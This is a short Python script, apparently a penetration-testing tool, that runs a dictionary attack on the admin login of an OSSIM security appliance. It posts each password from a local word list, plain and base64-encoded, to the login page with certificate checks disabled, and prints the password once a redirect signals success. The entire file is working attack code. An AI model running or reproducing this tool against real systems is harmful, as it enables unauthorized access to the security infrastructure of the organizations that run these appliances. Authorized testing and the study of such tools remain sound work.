#!/usr/bin/env python3

# OSSIM Login Bruteforce

#%%%%%%%%%%% Libraries %%%%%%%%%%%#

import os
import base64
import requests
from colorama import Fore, Style
from colorama import init
init()
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#%%%%%%%%%%% Constants %%%%%%%%%%%#

separator = "[*] ============================================================================================================== [*]"

#%%%%%%%%%% Functions %%%%%%%%%#

def ossimbrute(ossimip):

    url = "https://"+ossimip+"/ossim/session/login.php"
    __location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
    file = open(os.path.join(__location__, 'dict.txt'))
    successurl = "https://"+ossimip+"/ossim/"
    bruteforceresult = 0

    for line in file:
        ossimpassword = line.strip('\n\r')
        ossimpasswordb64 = base64.b64encode(ossimpassword.encode("utf-8"))
        base64string = str(ossimpasswordb64, "utf-8")
        params = {'embed':'','bookmark_string':'','user':'admin','passu':ossimpassword,'pass':base64string}

        try:
            response = requests.post(url,params=params,verify=False)

            if (response.status_code == 302 or response.url == successurl):
                print(separator)
                print("[!] Dictionary Attack Successful!")
                print(separator)
                print("[!] Username: "+Fore.RED+Style.BRIGHT+"admin")
                print(Style.RESET_ALL + "[!] Password: "+Fore.RED+Style.BRIGHT+ossimpassword)
                print(Style.RESET_ALL + separator)
                bruteforceresult = 1
                break

        except Exception as e:
            pass

    if (not bruteforceresult):
        print(separator)
        print("[!] Dictionary Attack Not Successful")
        print(separator)

#%%%%%%%%%% The End %%%%%%%%%%#

